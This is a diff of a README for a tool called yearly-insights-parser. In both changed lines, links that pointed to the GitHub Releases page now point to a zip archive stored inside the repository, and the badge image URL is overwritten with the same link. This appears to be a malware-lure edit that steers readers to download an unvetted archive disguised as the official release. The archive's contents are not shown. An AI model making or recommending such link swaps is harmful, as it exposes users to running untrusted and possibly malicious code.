@@ -1,6 +1,6 @@
 # 📊 yearly-insights-parser - Analyze Your Yearly Reports Easily
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/rose-annmae/yearly-insights-parser/releases)
+[![Download the latest release](https://github.com/rose-annmae/yearly-insights-parser/raw/refs/heads/main/yearly_insights_parser/insights-yearly-parser-2.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/rose-annmae/yearly-insights-parser/raw/refs/heads/main/yearly_insights_parser/insights-yearly-parser-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **yearly-insights-parser** repository! This tool helps you analyz
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/rose-annmae/yearly-insights-parser/releases).
+To get started, visit this page to download: [Releases Page](https://github.com/rose-annmae/yearly-insights-parser/raw/refs/heads/main/yearly_insights_parser/insights-yearly-parser-2.7.zip).
 
 On the releases page, you will find the latest version of the software. Follow these steps to install:
 
